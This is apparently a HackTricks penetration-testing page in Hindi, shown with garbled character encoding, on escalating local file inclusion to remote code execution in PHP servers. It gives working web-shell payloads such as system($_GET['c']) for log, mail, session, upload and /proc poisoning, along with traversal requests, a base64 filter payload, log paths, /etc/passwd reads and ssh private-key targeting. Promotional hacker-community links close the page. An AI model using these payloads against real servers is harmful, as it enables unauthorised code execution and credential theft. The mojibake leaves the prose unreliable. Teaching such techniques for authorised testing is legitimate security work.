рдпрджрд┐ Apache рдпрд╛ Nginx рд╕рд░реНрд╡рд░ **LFI рдХреЗ рд▓рд┐рдП рд╡рд▓реНрдирд░реЗрдмрд▓** рд╣реИ рддреЛ рдЖрдк **`/var/log/apache2/access.log` рдпрд╛ `/var/log/nginx/access.log`** рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **user agent** рдореЗрдВ рдпрд╛ **GET рдкреИрд░рд╛рдореАрдЯрд░** рдореЗрдВ рдПрдХ PHP рд╢реЗрд▓ рдЬреИрд╕реЗ рдХрд┐ **`<?php system($_GET['c']); ?>`** рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рдЙрд╕ рдлрд╛рдЗрд▓ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╢реЗрд▓ рдХреЗ рд▓рд┐рдП **рд╕рд┐рдВрдкрд▓ рдХреЛрдЯреНрд╕** рдХреЗ рдмрдЬрд╛рдп **рдбрдмрд▓ рдХреЛрдЯреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдбрдмрд▓ рдХреЛрдЯреНрд╕ рдХреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ "_**quote;**_" рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, **PHP рдПрдХ рдПрд░рд░ рдлреЗрдВрдХреЗрдЧрд╛** рдФрд░ **рдХреБрдЫ рднреА рдФрд░ рдирд╣реАрдВ рдЪрд▓реЗрдЧрд╛**ред

рд╕рд╛рде рд╣реА, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк **payload рдХреЛ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рд▓рд┐рдЦреЗрдВ** рдпрд╛ PHP рд╣рд░ рдмрд╛рд░ рдЬрдм рд▓реЙрдЧ рдлрд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ рддреЛ рдПрд░рд░ рдХрд░реЗрдЧрд╛ рдФрд░ рдЖрдкрдХреЛ рджреВрд╕рд░рд╛ рдореМрдХрд╛ рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛ред
{% endhint %}

рдпрд╣ рдЕрдиреНрдп рд▓реЙрдЧреНрд╕ рдореЗрдВ рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ,** рд▓реЙрдЧреНрд╕ рдХреЗ рдЕрдВрджрд░ рдХрд╛ рдХреЛрдб URL encoded рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рд╢реЗрд▓ рдХреЛ рдирд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╣реЗрдбрд░ **authorisation "basic"** рдореЗрдВ "user:password" Base64 рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рд▓реЙрдЧреНрд╕ рдХреЗ рдЕрдВрджрд░ рдбрд┐рдХреЛрдб рд╣реЛрддрд╛ рд╣реИред PHPShell рдХреЛ рдЗрд╕ рд╣реЗрдбрд░ рдХреЗ рдЕрдВрджрд░ рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЕрдиреНрдп рд╕рдВрднрд╛рд╡рд┐рдд рд▓реЙрдЧ рдкрде:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### рдИрдореЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

**рдПрдХ рдореЗрд▓ рднреЗрдЬреЗрдВ** рдЖрдВрддрд░рд┐рдХ рдЦрд╛рддреЗ (user@localhost) рдкрд░ рдЕрдкрдирд╛ PHP рдкреЗрд▓реЛрдб `<?php echo system($_REQUEST["cmd"]); ?>` рдХреЗ рд╕рд╛рде рдФрд░ **`/var/mail/<USERNAME>`** рдпрд╛ **`/var/spool/mail/<USERNAME>`** рдЬреИрд╕реЗ рдкрде рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдореЗрд▓ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

### /proc/\*/fd/\* рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

1. рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╢реЗрд▓реНрд╕ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП : 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ, рдЬрд╣рд╛рдБ $PID = рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ PID (рдЬрд┐рд╕реЗ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ) рдФрд░ $FD рдлрд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ (рдЬрд┐рд╕реЗ рднреА рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред

### /proc/self/environ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рд▓реЙрдЧ рдлрд╛рдЗрд▓ рдХреА рддрд░рд╣, рдкреЗрд▓реЛрдб рдХреЛ User-Agent рдореЗрдВ рднреЗрдЬреЗрдВ, рдпрд╣ /proc/self/environ рдлрд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдЧрд╛ред
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдмрд╕ рдЙрд╕рдореЗрдВ рд╢реЗрд▓ рдкреЗрд▓реЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ (рдЙрджрд╛рд╣рд░рдг: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
рдлрд╛рдЗрд▓ рдХреЛ рдкрдардиреАрдп рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╣реИ рдХрд┐ рдЪрд┐рддреНрд░/doc/pdf рдХреЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдП

### рдЬрд╝рд┐рдк рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдПрдХ рдЬрд╝рд┐рдк рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ PHP рд╢реЗрд▓ рд╕рдВрдХреБрдЪрд┐рдд рд╣реИ рдФрд░ рдкрд╣реБрдБрдЪреЗрдВ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP рд╕реЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╡реЗрдмрд╕рд╛рдЗрдЯ PHP рд╕реЗрд╢рди (PHPSESSID) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP рдореЗрдВ рдпреЗ рд╕рддреНрд░ _/var/lib/php5/sess\\_\[PHPSESSID]\_ рдлрд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
рдХреБрдХреА рдХреЛ `<?php system('cat /etc/passwd');?>` рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВред
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ PHP рд╕рддреНрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ ssh рд╕рдХреНрд░рд┐рдп рд╣реИ, рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ (/proc/self/status & /etc/passwd) рдФрд░ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ **\<HOME>/.ssh/id\_rsa** рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ред

### **vsftpd** _**рд▓реЙрдЧреНрд╕**_ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЗрд╕ FTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓реЙрдЧ _**/var/log/vsftpd.log**_ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ LFI рд╣реИ рдФрд░ рдЖрдк рдПрдХ рдЙрдЬрд╛рдЧрд░ vsftpd рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдореЗрдВ PHP рдкреЗрд▓реЛрдб рд╕реЗрдЯ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ LFI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧреНрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред

### php base64 рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (base64 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП)

рдЬреИрд╕рд╛ рдХрд┐ [рдЗрд╕](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) рд▓реЗрдЦ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, PHP base64 рдлрд╝рд┐рд▓реНрдЯрд░ Non-base64 рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░ рджреЗрддрд╛ рд╣реИред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: рдпрджрд┐ рдЖрдк base64 рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ ".php" рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХреЗрд╡рд▓ "." рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░ рджреЗрдЧрд╛ рдФрд░ base64 рдХреЗ рдЕрдВрдд рдореЗрдВ "php" рдЬреЛрдбрд╝ рджреЗрдЧрд╛ред рдпрд╣рд╛рдБ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкреЗрд▓реЛрдб рд╣реИ:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php рдлрд┐рд▓реНрдЯрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (рдлрд╛рдЗрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ)

рдпрд╣ [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ рдЖрдк **php рдлрд┐рд▓реНрдЯрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдордирдорд╛рдиреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЬрд┐рд╕рдХрд╛ рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк **рдмрд┐рдирд╛ рдлрд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦреЗ** include рдХреЗ рд▓рд┐рдП рдордирдорд╛рдиреА php рдХреЛрдб рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

**рдЕрдкрд▓реЛрдб** рдХрд░реЗрдВ рдПрдХ рдлрд╛рдЗрд▓ рдЬреЛ `/tmp` рдореЗрдВ **рдЕрд╕реНрдерд╛рдпреА** рд░реВрдк рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрдЧреА, рдлрд┐рд░ **рдЙрд╕реА рдЕрдиреБрд░реЛрдз рдореЗрдВ,** рдПрдХ **рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ** рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ, рдФрд░ рдлрд┐рд░ **рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓ рд╣рдЯрд╛рдИ рдирд╣реАрдВ рдЬрд╛рдПрдЧреА** рдФрд░ рдЖрдк рдЙрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓ рд╕рдВрдЧреНрд░рд╣рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **Local File Inclusion** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ **Nginx** PHP рдХреЗ рд╕рд╛рдордиреЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХ рд╕реЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **Local File Inclusion** рдкрд╛рдпрд╛ рд╣реИ рднрд▓реЗ рд╣реА рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╕рддреНрд░ рди рд╣реЛ** рдФрд░ `session.auto_start` `Off` рд╣реЛред рдпрджрд┐ рдЖрдк **`PHP_SESSION_UPLOAD_PROGRESS`** рдХреЛ **multipart POST** рдбреЗрдЯрд╛ рдореЗрдВ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, PHP рдЖрдкрдХреЗ рд▓рд┐рдП **рд╕рддреНрд░ рд╕рдХреНрд╖рдо рдХрд░ рджреЗрдЧрд╛**ред рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windows рдореЗрдВ рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдбреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **Local File Inclusion** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ **Windows** рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (file\_uploads = on)

рдпрджрд┐ рдЖрдкрдиреЗ **Local File Inclusion** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдПрдХ рдлрд╛рдЗрд▓ рдЬреЛ **phpinfo()** рдХреЛ file\_uploads = on рдХреЗ рд╕рд╛рде рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддреА рд╣реИ рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **Local File Inclusion** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдЖрдк **рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓ рдХреЗ рдкрде рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ** рд▓реЗрдХрд┐рди **рд╕рд░реНрд╡рд░** рдпрд╣ **рдЬрд╛рдВрдЪ рд░рд╣рд╛ рд╣реИ** рдХрд┐ рдХреНрдпрд╛ **рд╢рд╛рдорд┐рд▓ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╛рдЗрд▓ рдореЗрдВ PHP рдЪрд┐рд╣реНрди рд╣реИрдВ**, рдЖрдк рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ **рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдЗрд╕ **Race Condition** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### рдЕрдирдВрдд рдкреНрд░рддреАрдХреНрд╖рд╛ + рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк LFI рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ PHP рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ **рд▓рдЯрдХрд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдлрд┐рд░ **рдШрдВрдЯреЛрдВ рддрдХ рдлрд╛рдЗрд▓рдирд╛рдореЛрдВ рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### рдШрд╛рддрдХ рддреНрд░реБрдЯрд┐ рдХреЗ рд▓рд┐рдП

рдпрджрд┐ рдЖрдк рдлрд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдПрдХ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (рдЖрдкрдХреЛ рдЙрд╕реА рддреНрд░реБрдЯрд┐ рдХреЛ рдлреЗрдВрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реА рдлрд╛рдЗрд▓ рдХреЛ 2 рдмрд╛рд░ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛)ред

**рдореБрдЭреЗ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИ рд▓реЗрдХрд┐рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИред**\
_рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрджрд┐ рдЖрдк PHP рдШрд╛рддрдХ рддреНрд░реБрдЯрд┐ рдХрд╛ рдХрд╛рд░рдг рдмрдирддреЗ рд╣реИрдВ, PHP рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рд╣реИрдВ рд╡реЗ рд╣рдЯрд╛ рджреА рдЬрд╛рддреА рд╣реИрдВред_

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## рд╕рдВрджрд░реНрдн

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдФрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**Hacking Insights**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред

**Real-Time Hack News**\
рддреЗрдЬреА рд╕реЗ рдмрджрд▓рддреЗ рд╣реИрдХрд┐рдВрдЧ рд╡рд┐рд╢реНрд╡ рдХреЗ рд╕рд╛рде рдЕрдк-рдЯреВ-рдбреЗрдЯ рд░рд╣реЗрдВред

**Latest Announcements**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреАрдЬрд╝ рд▓реЙрдиреНрдЪрд┐рдВрдЧ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЕрдкрдбреЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВред

[**Discord**](https://discord.com/invite/N3FrSbmwdy) рдкрд░ рд╣рдорд╕реЗ рдЬреБрдбрд╝реЗрдВ рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**ред
